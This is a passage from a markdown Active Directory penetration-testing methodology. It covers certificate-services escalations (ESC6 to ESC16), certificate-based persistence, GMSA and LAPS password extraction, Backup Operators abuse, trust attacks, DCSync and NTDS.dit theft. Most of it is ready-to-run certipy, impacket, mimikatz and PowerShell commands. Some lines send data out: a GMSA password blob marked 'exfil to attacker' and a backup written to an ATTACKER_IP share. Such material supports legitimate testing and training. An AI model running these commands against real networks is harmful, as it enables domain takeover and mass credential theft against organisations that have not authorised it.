# bloodyAD -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' --host <DC_IP> set object 'CERTIFRIED$' dNSHostName -v '<DC_FQDN>'

# 3. Request a certificate as the machine account (certipy)
certipy-ad req -u 'CERTIFRIED$@<DOMAIN>' -p 'Password123!' -ca '<CA_NAME>' -template 'Machine' -target <DC_IP>

# 4. Authenticate with the certificate (gets DC machine account hash)
certipy-ad auth -pfx certifried.pfx -dc-ip <DC_IP> -domain <DOMAIN>
# Returns NT hash of the DC machine account → DCSync
```

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Phase 7: Advanced AD CS Attacks

### 7.1 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag
```bash
# If the CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set:
# Any template supporting client auth can be abused like ESC1

certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout
# Look for: "EDITF_ATTRIBUTESUBJECTALTNAME2" in CA configuration

# Exploit exactly like ESC1 (specify UPN of target)
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<ANY_CLIENT_AUTH_TEMPLATE>' -upn 'administrator@<DOMAIN>' -target <DC_IP>
```

### 7.2 ESC7 — Vulnerable CA ACL (ManageCA / ManageCertificates)
```bash
# ESC7: Your user has ManageCA or ManageCertificates rights on the CA itself
# ManageCA = CA Administrator → can enable EDITF_ATTRIBUTESUBJECTALTNAME2 (turns any template into ESC6)
# ManageCertificates = CA Officer → can approve pending certificate requests

# Check: certipy output shows "ManageCA" or "ManageCertificates" for your principal

# Attack path 1: ManageCA → enable SAN flag → ESC6 → ESC1
# 1. Add yourself as CA officer (requires ManageCA)
certipy-ad ca -ca '<CA_NAME>' -add-officer '<USER>' -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP>

# 2. Enable EDITF_ATTRIBUTESUBJECTALTNAME2 flag
certipy-ad ca -ca '<CA_NAME>' -enable-flag EDITF_ATTRIBUTESUBJECTALTNAME2 -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP>

# 3. Now exploit as ESC1/ESC6 — request cert with arbitrary UPN
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template 'User' -upn 'administrator@<DOMAIN>' -target <DC_IP>

# 4. Authenticate with the certificate
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP> -domain <DOMAIN>

# Attack path 2: ManageCertificates → approve pending requests
# If a template requires CA manager approval (pending state):
# 1. Request a certificate (it goes to pending)
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>' -target <DC_IP>
# Note the request ID from output

# 2. Approve the pending request (requires ManageCertificates)
certipy-ad ca -ca '<CA_NAME>' -issue-request <REQUEST_ID> -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP>

# 3. Retrieve the issued certificate
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -retrieve <REQUEST_ID> -target <DC_IP>
```

### 7.3 ESC9 / ESC10 — Certificate Mapping Abuse
```bash
# ESC9  = template has CT_FLAG_NO_SECURITY_EXTENSION → cert lacks SID extension → DC falls back to UPN
# ESC10 Case 1 = DC has StrongCertificateBindingEnforcement=0 → DC accepts ANY cert without SID extension
# ESC10 Case 2 = DC has CertificateMappingMethods bit 0x4 set → UPN-based Schannel mapping
# Applies when: SCBE < 2 (default pre-Feb 2025; common on lab/exam boxes). If SCBE=2, pivot to ESC16.

# Check SCBE (ESC9 / ESC10 Case 1) — on DC:
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
# 0=disabled, 1=compat (both vulnerable), 2=enforced (blocks ESC9/ESC10 Case 1 — try ESC16)

# Check CertificateMappingMethods (ESC10 Case 2) — Schannel registry key:
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v CertificateMappingMethods
# Default 0x18; bit 0x4 = UPN mapping enabled (vulnerable for Schannel)

# Exploit (requires GenericWrite on a controlled user):
# 1. Flip UPN to target
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -user '<CONTROLLED_USER>' -upn 'administrator' -dc-ip <DC_IP>
# 2. Request cert as controlled user
certipy-ad req -u '<CONTROLLED_USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template 'User' -dc-ip <DC_IP>
# 3. Restore UPN
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -user '<CONTROLLED_USER>' -upn '<CONTROLLED_USER>@<DOMAIN>' -dc-ip <DC_IP>
# 4. Authenticate
certipy-ad auth -pfx user.pfx -dc-ip <DC_IP> -domain <DOMAIN>

# If KDC_ERR_CLIENT_NOT_TRUSTED → DC has SCBE=2 with security extension. Pivot to ESC16.
# If auth maps to original user → UPN flip didn't replicate; retry after 60s.
```

### 7.4 ESC11 — NTLM Relay to RPC Certificate Enrollment (ICPR)
```bash
# ESC11: CA does not enforce IF_ENFORCEENCRYPTICERTREQUEST on the RPC interface
# Allows NTLM relay to the RPC enrollment endpoint (instead of HTTP like ESC8)

# 1. Check if the CA's RPC interface lacks encryption enforcement
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout
# Look for: "Enforce Encryption for Requests: Disabled" on the CA

# 2. Coerce + relay to RPC enrollment
# Start relay targeting the CA's RPC endpoint
impacket-ntlmrelayx -t 'rpc://<CA_IP>' -rpc-mode icpr -icpr-ca-name '<CA_NAME>' -smb2support

# 3. Trigger coercion (PetitPotam, PrinterBug, DFSCoerce)
python3 PetitPotam.py <RELAY_LISTENER_IP> <DC_IP>

# 4. Authenticate with the obtained certificate
certipy-ad auth -pfx dc.pfx -dc-ip <DC_IP> -domain <DOMAIN>
```

### 7.5 ESC13 — Issuance Policy OID Group Link
```bash
# ESC13: Certificate template has an issuance policy OID linked to a group
# Enrolling in the template grants membership in that group via the certificate

# 1. Enumerate with certipy — look for ESC13 in output
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout

# 2. If a template's issuance policy OID is linked to a privileged group:
# Request the certificate (enrollment grants effective group membership)
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -target <DC_IP>

# 3. Authenticate — the certificate grants access as if you're in the linked group
certipy-ad auth -pfx cert.pfx -dc-ip <DC_IP> -domain <DOMAIN>
```

### 7.6 ESC14 — Explicit Certificate Mapping (`altSecurityIdentities`)

ESC14 abuses write rights over a victim's `altSecurityIdentities` attribute to bind an attacker-controlled cert to that account, then PKINIT-auths as the victim. Distinct from ESC13 (OID-to-group on a template's issuance policy). Reference: [SpecterOps ESC14 abuse](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9).

```bash
# Enumerate
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout

# Attack — needs WriteProperty on victim's altSecurityIdentities (BloodHound edge)
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template 'User' -target <DC_IP>
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' \
    -user '<VICTIM>' -alt-security-identity 'X509:<I><CERT_ISSUER_DN><S><CERT_SUBJECT_DN>' \
    -dc-ip <DC_IP>

# 3. Authenticate — the certificate grants effective membership in the linked group
certipy-ad auth -pfx cert.pfx -dc-ip <DC_IP> -domain <DOMAIN>
```

> **ESC13 vs ESC14:** ESC13 = template has issuance policy OID that happens to link to a group. ESC14 = the OID object itself has `msDS-OIDToGroupLink` pointing to a group, and you can either exploit an existing link or create one if you have write access to the OID object.

### 7.7 ESC15 — EKUwu (CVE-2024-49019)
```bash
# Applies when: v1 template + enrollee can supply SAN + CA missing Nov 2024 KB5044284/5044285
# Test cost: certipy find flags it; effectively free
# If patched: CA validates Application Policies from template, not request — no ESC15 path on this template

certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout    # look for ESC15

# Path A — direct Client Auth injection (works on most v1 templates with permissive EKU/AppPolicy)
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' \
  -template '<VULN_V1_TEMPLATE>' -target <DC_IP> \
  -application-policies '1.3.6.1.5.5.7.3.2'                 # Client Auth
certipy-ad auth -pfx cert.pfx -dc-ip <DC_IP> -domain <DOMAIN>

# Path B — Cert Request Agent → ESC3-style on-behalf-of (when target needs admin impersonation)
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' \
  -template '<VULN_V1_TEMPLATE>' -target <DC_IP> \
  -application-policies '1.3.6.1.4.1.311.20.2.1'             # Cert Request Agent
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' \
  -template 'User' -on-behalf-of '<DOMAIN>\Administrator' -pfx agent.pfx -target <DC_IP>
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP> -domain <DOMAIN>
```

### 7.8 ESC16 — CA-Level Security Extension Stripping
```bash
# CA has DisableExtensionList containing 1.3.6.1.4.1.311.25.2 → all issued certs lack SID extension
# → DC falls back to UPN mapping EVEN WITH StrongCertificateBindingEnforcement=2
# → only ADCS escalation that works against fully-hardened (Feb 2025+) AD

# Detect:
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout
# Look for "ESC16" + "Disabled Extensions: 1.3.6.1.4.1.311.25.2"

# Exploit (same chain as ESC9, but works against SCBE=2):
# 1. Flip UPN
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -user '<CONTROLLED_USER>' -upn 'administrator' -dc-ip <DC_IP>
# 2. Request cert from the ESC16 CA
certipy-ad req -u '<CONTROLLED_USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template 'User' -dc-ip <DC_IP>
# 3. Restore UPN
certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -user '<CONTROLLED_USER>' -upn '<CONTROLLED_USER>@<DOMAIN>' -dc-ip <DC_IP>
# 4. Auth
certipy-ad auth -pfx cert.pfx -dc-ip <DC_IP> -domain <DOMAIN>

# If find doesn't flag ESC16 → CA is not stripping. Check ESC9/10/8 instead.
# Mitigation: remove 1.3.6.1.4.1.311.25.2 from CA DisableExtensionList. No patch — config only.
```

### 7.9 Domain Persistence via ADCS (DPERSIST)
```bash
# DPERSIST1: Steal CA private key → forge any certificate
# If you have admin on the CA server:
certipy-ad ca -backup -u 'Administrator@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -target <CA_IP>
# Use stolen CA cert+key to forge certificates:
certipy-ad forge -ca-pfx ca.pfx -upn 'administrator@<DOMAIN>' -subject 'CN=Administrator'
certipy-ad auth -pfx forged.pfx -dc-ip <DC_IP> -domain <DOMAIN>

# --- DPERSIST2: Add rogue CA certificate to NTAuthCertificates ---
# Allows forged certificates from a CA YOU control to be trusted for AD authentication.
# Requires Enterprise Admin or equivalent (write to Configuration partition).
# Generate your own CA cert+key locally:
openssl req -newkey rsa:2048 -keyout rogueca.key -x509 -days 3650 \
    -out rogueca.crt -subj '/CN=RogueRootCA' -nodes
# Push it into NTAuthCertificates:
certutil -dspublish -f rogueca.crt NTAuthCA
# Verify it landed (LDAP read of cACertificate attribute on CN=NTAuthCertificates,...):
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' \
    -b 'CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<TLD>' cACertificate
# Now sign client-auth certs with rogueca.key for ANY domain user → certipy-ad auth → TGT.

# --- DPERSIST3: Modify a certificate template for persistent ESC1 ---
# Pick a template whose ACL you can already write (or grant yourself WriteProperty via ACL chain).
# 1. Add your account to enrollment rights:
certipy-ad template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> \
    -template '<TEMPLATE_NAME>' -save-old
# This dumps current template config to <TEMPLATE_NAME>.json. Edit it to make it ESC1-vulnerable:
#   "msPKI-Certificate-Name-Flag": -1593835519   (bit 0x1 = ENROLLEE_SUPPLIES_SUBJECT)
#   "pKIExtendedKeyUsage": ["1.3.6.1.5.5.7.3.2"]   (Client Authentication)
#   add your SID to the Enrollment Rights ACE in "nTSecurityDescriptor"
# Then write it back:
certipy-ad template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> \
    -template '<TEMPLATE_NAME>' -configuration <TEMPLATE_NAME>.json
# Now any time you (or a backup account) need DA, request a cert and authenticate:
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' \
    -template '<TEMPLATE_NAME>' -upn 'administrator@<DOMAIN>' -dc-ip <DC_IP>
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP> -domain <DOMAIN>
```

### 7.10 ESC5 — Vulnerable PKI Object ACLs
If an attacker controls PKI-related AD objects (CA computer account, CA's RPC/DCOM server, or any object in `CN=Public Key Services,CN=Services,CN=Configuration`), they can manipulate the CA configuration to enable other ESC attacks.

```bash
# Enumerate PKI object ACLs with certipy
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout
# Look for: ESC5 in output — indicates writable PKI objects

# Key PKI objects to check ACLs on:
# - CN=<CA_NAME>,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,...
# - CN=<CA_NAME>,CN=Certification Authorities,...
# - CN=NTAuthCertificates,...
# - The CA server's AD computer object itself

# Manual check via PowerView:
Get-DomainObjectAcl -SearchBase "CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<TLD>" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite' }
```

```bash
# Attack: If you have write access to the CA's enrollment services object,
# you can modify certificate template references, add new templates, or
# change security descriptors to enable ESC1/ESC4-style attacks.

# Example: Grant yourself ManageCA rights on the CA object via WriteDACL
impacket-dacledit -action 'write' -rights 'FullControl' -principal '<USER>' \
  -target '<CA_COMPUTER>$' '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
# Then proceed with ESC7 attack path (7.2)
```

### 7.11 ESC12 — ADCS CA with External Key Storage (YubiHSM)
If the CA uses a YubiHSM device for key storage and you have shell access to the CA server, you can interact with the YubiHSM to issue arbitrary certificates.

```bash
# Enumerate — check if CA uses YubiHSM
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout
# Look for: ESC12 in output or YubiHSM provider references

# If you have a shell on the CA server:
# Check the CA's crypto provider
certutil -store my
# Look for: "Provider = YubiHSM Key Storage Provider"

# The YubiHSM authentication key (default PIN: 0001password) is often left at default
# or stored in the registry:
reg query "HKLM\\SOFTWARE\\Yubico\\YubiHSM" /s
```

```bash
# Attack: With access to the CA server + YubiHSM credentials,
# use certipy to issue certificates directly via the CA
# This requires local admin on the CA server

# Connect to YubiHSM and issue a certificate for any user
certipy-ad ca -ca '<CA_NAME>' -u 'Administrator@<DOMAIN>' -p '<PASSWORD>' -target <CA_IP> \
  -issue-request <REQUEST_ID>

# Or forge a certificate if you can extract the CA private key via YubiHSM API
# (Requires the YubiHSM auth key — check for default: 0001password)
```

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Phase 8: GMSA & LAPS Extraction

### 8.1 GMSA (Group Managed Service Accounts) Password Extraction
```bash
# GMSA passwords can be read by principals listed in msDS-GroupMSAMembership
# BloodHound: look for "ReadGMSAPassword" edges

# Check who can read GMSA password (LDAP)
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(&(objectClass=msDS-GroupManagedServiceAccount))" msDS-GroupMSAMembership sAMAccountName

# Extract GMSA password (if your user has read rights)
# Method 1: gMSADumper
# https://github.com/micahvandeusen/gMSADumper
python3 gMSADumper.py -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -l <DC_IP>

# Method 2: netexec
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --gmsa

# Method 3: bloodyAD
bloodyAD -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' --host <DC_IP> get object '<GMSA_ACCOUNT>$' --attr msDS-ManagedPassword

# Method 4: From Windows (PowerShell/AD module)
$gmsa = Get-ADServiceAccount -Identity '<GMSA_NAME>' -Properties 'msDS-ManagedPassword'
$blob = $gmsa.'msDS-ManagedPassword'
# Parse the blob to extract the NT hash

# Use the GMSA hash
netexec smb <SUBNET>/24 -u '<GMSA_NAME>$' -H '<NT_HASH>'
impacket-psexec '<DOMAIN>/<GMSA_NAME>$'@<TARGET_IP> -hashes :<NT_HASH>
```

#### Living-off-the-land equivalent — native GMSA discovery

When RSAT is present on the foothold (common on jump-hosts), enumerate GMSAs and their access ACL with `Get-ADServiceAccount` — no gMSADumper, no netexec. The `msDS-ManagedPassword` blob is only readable by principals listed in `PrincipalsAllowedToRetrieveManagedPassword`.

```powershell
# Discover all GMSAs and who can retrieve their passwords
Get-ADServiceAccount -Filter * -Properties `
    msDS-ManagedPasswordId, msDS-GroupMSAMembership, PrincipalsAllowedToRetrieveManagedPassword |
    Select-Object Name, SamAccountName, PrincipalsAllowedToRetrieveManagedPassword

# Retrieve and decode the password blob (only works if your principal is in the access ACL)
$gmsa = Get-ADServiceAccount -Identity '<GMSA_NAME>' -Properties 'msDS-ManagedPassword'
# msDS-ManagedPassword is a MSDS-MANAGEDPASSWORD_BLOB structure;
# the first 16 bytes after the header are the current NT-equivalent password.
# Native parsing requires DSInternals (Install-Module DSInternals) or a few lines of struct unpacking;
# without DSInternals, transfer the blob to gMSADumper/secretsdump for decoding.

# RSAT-free fallback — pull the blob with [adsisearcher]
$s = [adsisearcher]"(&(objectClass=msDS-GroupManagedServiceAccount)(samaccountname=<GMSA_NAME>$))"
$s.PropertiesToLoad.Add('msDS-ManagedPassword') | Out-Null
$blob = $s.FindOne().Properties['msds-managedpassword'][0]
[System.Convert]::ToBase64String($blob)   # exfil to attacker for offline decode
```

> **LOTL note:** Reading `msDS-ManagedPassword` is logged on the DC as a directory access event when auditing is enabled. The attribute is constructed virtually — only readable when the calling principal matches the SDDL in `msDS-GroupMSAMembership`.

### 8.2 LAPS v1 & v2 (Windows LAPS) Password Extraction
```bash
# LAPS v1: ms-Mcs-AdmPwd attribute (plaintext)
# LAPS v2 / Windows LAPS: msLAPS-Password or msLAPS-EncryptedPassword attribute

# Check for LAPS (BloodHound or LDAP)
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd sAMAccountName

# Extract LAPS passwords via netexec
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --laps
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --laps

# Windows LAPS (v2) — encrypted password
# If your account is in the decryption ACL:
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(msLAPS-Password=*)" msLAPS-Password sAMAccountName

# From Windows:
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} | Select-Object Name, ms-Mcs-AdmPwd
```

#### Living-off-the-land equivalent — native LAPS v1 + v2 read

```powershell
# === LAPS v1 (legacy) — ms-Mcs-AdmPwd plaintext ===
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
    Where-Object { $_.'ms-Mcs-AdmPwd' } |
    Select-Object Name, ms-Mcs-AdmPwd, @{n='Expires';e={[datetime]::FromFileTime($_.'ms-Mcs-AdmPwdExpirationTime')}}

# === Windows LAPS v2 — msLAPS-Password (JSON) and msLAPS-EncryptedPassword (DPAPI-NG) ===
Get-ADComputer -Filter * -Properties msLAPS-Password, msLAPS-EncryptedPassword, msLAPS-PasswordExpirationTime |
    Where-Object { $_.'msLAPS-Password' -or $_.'msLAPS-EncryptedPassword' } |
    Select-Object Name, msLAPS-Password, msLAPS-EncryptedPassword

# msLAPS-Password value is JSON: {"n":"<account>","t":"<filetime>","p":"<plaintext>"}
($lapsRaw = (Get-ADComputer <TARGET_COMPUTER> -Properties msLAPS-Password).'msLAPS-Password') | ConvertFrom-Json

# msLAPS-EncryptedPassword is DPAPI-NG protected to the AD-resolved group's certificate;
# decrypt requires LAPS RSAT cmdlet (Win11 / Server 2022 with LAPS module installed):
Get-LapsADPassword -Identity <TARGET_COMPUTER> -AsPlainText

# === RSAT-free fallback via [adsisearcher] (works against any DC) ===
$s = [adsisearcher]"(samaccountname=<TARGET_COMPUTER>$)"
$s.PropertiesToLoad.AddRange(@('mslaps-password','mslaps-encryptedpassword','ms-mcs-admpwd'))
$s.FindOne().Properties
```

> **LOTL note:** All three attributes are confidential — the DC silently returns nothing when the calling principal lacks `ControlAccessRight` on the attribute. Use `dsacls` or BloodHound `ReadLAPSPassword` edges to identify who can read which attribute. Reads are logged as Event 4662 with a specific GUID per attribute.

### 8.3 Machine Account Quota & Computer Account Abuse
```bash
# Check MachineAccountQuota (default: 10 — any domain user can create up to 10 computer objects)
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -M maq

# Or via LDAP:
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(objectClass=domain)" ms-DS-MachineAccountQuota

# If > 0, you can create machine accounts for:
# - RBCD attacks
# - noPac attacks
# - Certifried attacks
# - Any attack requiring a controlled computer account

# Create machine account
impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -computer-name 'YOURPC$' -computer-pass 'YourP@ss123!' -dc-ip <DC_IP>
```

### 8.4 Backup Operators Group Abuse (Domain-Level)
Members of the `Backup Operators` group have `SeBackupPrivilege` and `SeRestorePrivilege` on Domain Controllers. This allows bypassing file ACLs to read any file on the DC, including `NTDS.dit` — leading to full domain compromise.

> **Note:** This differs from local `SeBackupPrivilege` abuse (see [windows-methodology.md](windows-methodology.md)). Backup Operators group membership grants these privileges specifically on DCs.

```powershell
# 1. Verify group membership
net user <USER> /domain | findstr -i "Backup"
# Or from Linux:
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(&(objectClass=group)(cn=Backup Operators))" member
```

```powershell
# 2. Method 1: diskshadow.exe — create shadow copy of NTDS.dit on DC
# Create a diskshadow script:
# diskshadow_script.txt:
#   set context persistent nowriters
#   add volume c: alias myAlias
#   create
#   expose %myAlias% z:
#   exec "cmd.exe" /c copy z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
#   delete shadows volume %myAlias%
#   reset

# Execute on DC (requires interactive session — RDP or evil-winrm):
diskshadow.exe /s C:\temp\diskshadow_script.txt

# 3. Copy NTDS.dit using robocopy /B (bypasses ACLs via backup semantics)
robocopy /B z:\Windows\NTDS C:\temp ntds.dit

# 4. Export SYSTEM hive
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

```powershell
# 5. Method 2: wbadmin-based extraction
# Create a backup of the C: drive (stores NTDS.dit)
wbadmin start backup -backupTarget:\\<ATTACKER_IP>\share -include:C: -quiet

# Recover NTDS.dit from the backup
wbadmin start recovery -version:<BACKUP_VERSION> -items:C:\Windows\NTDS\ntds.dit -recoverytarget:C:\temp -notrestoreacl -quiet
```

```bash
# 6. Method 3: Remote extraction from Linux (if you have Backup Operators creds)
# Use impacket-secretsdump with backup privileges:
impacket-secretsdump -use-vss '<DOMAIN>/<BACKUP_USER>:<PASSWORD>@<DC_IP>'
# The -use-vss flag creates a Volume Shadow Copy remotely (requires Backup Operators or admin)

# 7. Download NTDS.dit + SYSTEM hive and extract offline
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

> **Exfiltration:** Transfer `ntds.dit` and `SYSTEM` hive off the DC via SMB, HTTP, or any method from [file-transfers.md](file-transfers.md). Then extract all hashes offline.

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Phase 9: Trust Attacks

**Goal:** Escalate across domain or forest trusts.

### 9.1 Parent-Child Trust (SID History / ExtraSIDs)
```bash
# Requires: Domain Admin in child domain + krbtgt hash of child domain

# 1. Get child domain's krbtgt hash
impacket-secretsdump <CHILD_DOMAIN>/Administrator@<CHILD_DC_IP> -hashes :<NT_HASH>

# 2. Get the SID of the Enterprise Admins group in the parent domain
# (Parent Domain SID)-519

# 3. Forge Golden Ticket with ExtraSIDs
impacket-ticketer -nthash <CHILD_KRBTGT_HASH> -domain-sid <CHILD_SID> -domain <CHILD_DOMAIN> -extra-sid <PARENT_SID>-519 Administrator

# 4. Use the ticket against the parent DC
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <CHILD_DOMAIN>/Administrator@<PARENT_DC_FQDN>

# Automated: raiseChild.py (does all of the above in one command)
impacket-raiseChild -target-exec <PARENT_DC_IP> <CHILD_DOMAIN>/Administrator
# Automatically: gets krbtgt hash → forges golden ticket with ExtraSIDs → gets shell on parent DC
```

### 9.2 Cross-Trust Kerberoasting
```bash
# Kerberoast accounts in a trusted domain
impacket-GetUserSPNs <TRUSTED_DOMAIN>/<USER>:<PASSWORD> -target-domain <TARGET_DOMAIN> -dc-ip <TRUSTED_DC_IP> -request
```

### 9.3 Cross-Forest Trust Attacks
```bash
# Cross-forest trusts are more restrictive than intra-forest trusts
# SID filtering blocks ExtraSIDs attacks across forest boundaries
# But these attacks still work:

# 1. Cross-forest Kerberoasting (same as 7.2)
impacket-GetUserSPNs <FOREST_A_DOMAIN>/<USER>:<PASSWORD> -target-domain <FOREST_B_DOMAIN> -dc-ip <FOREST_A_DC_IP> -request

# 2. Foreign group membership — enumerate users from Forest A that are members of groups in Forest B
# BloodHound: look for cross-forest edges
# PowerView:
Get-DomainForeignGroupMember -Domain <FOREST_B_DOMAIN>
Get-DomainForeignUser -Domain <FOREST_B_DOMAIN>

# 3. Shared credentials — users often reuse passwords across forests
# Spray creds obtained in Forest A against Forest B
netexec smb <FOREST_B_DC_IP> -u '<USER>' -p '<PASSWORD>'

# 4. Trust key extraction (requires DA in one forest)
# Dump trust keys with secretsdump
impacket-secretsdump <DOMAIN>/Administrator@<DC_IP> -hashes :<NT_HASH>
# Look for: [TRUST_DOMAIN]$ entries → inter-realm trust key

# 5. SID History injection (only works if SID filtering is disabled — rare across forests)
# Check trust properties:
# PowerView: Get-DomainTrust | Select-Object TargetName,TrustAttributes
# TrustAttributes containing TREAT_AS_EXTERNAL or FOREST_TRANSITIVE may have relaxed filtering
```

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Phase 10: Domain Compromise

**Goal:** Extract all domain credentials and establish persistent access.

### 10.1 DCSync
```bash
# Requires: Domain Admin, or accounts with Replicating Directory Changes + Replicating Directory Changes All

# Full dump (all hashes + Kerberos keys)
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
impacket-secretsdump <DOMAIN>/<USER>@<DC_IP> -hashes :<NT_HASH>

# NTLM hashes only (faster, skips Kerberos keys)
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-ntlm

# Using a Kerberos ticket (kirbi → ccache → secretsdump)
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=/path/to/ticket.ccache
# Direct (tunnel landing on localhost):
impacket-secretsdump -k -no-pass '<DOMAIN>/<USER>@dc01.<DOMAIN>' -just-dc-ntlm -dc-ip 127.0.0.1
# Through SOCKS proxy (full DC IP):
proxychains impacket-secretsdump -k -no-pass '<DOMAIN>/<USER>@dc01.<DOMAIN>' -just-dc-ntlm -dc-ip <DC_IP>

# Specific user only
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user Administrator
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt

# From Windows (Mimikatz)
# https://github.com/gentilkiwi/mimikatz
.\mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:Administrator" "exit"   # 🔴 4662 with replicate-all GUID
.\mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:krbtgt" "exit"          # 🔴 same; prefer over /all on real engagements
.\mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /all /csv" "exit"             # 🔴🔴 textbook XDR alert — exam only, never live
```

### 10.2 NTDS.dit Extraction (Alternative to DCSync)
```powershell
# Volume Shadow Copy (on DC)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# esentutl (native LOLBin — copies locked files without shadow copy)
esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\temp\ntds.dit
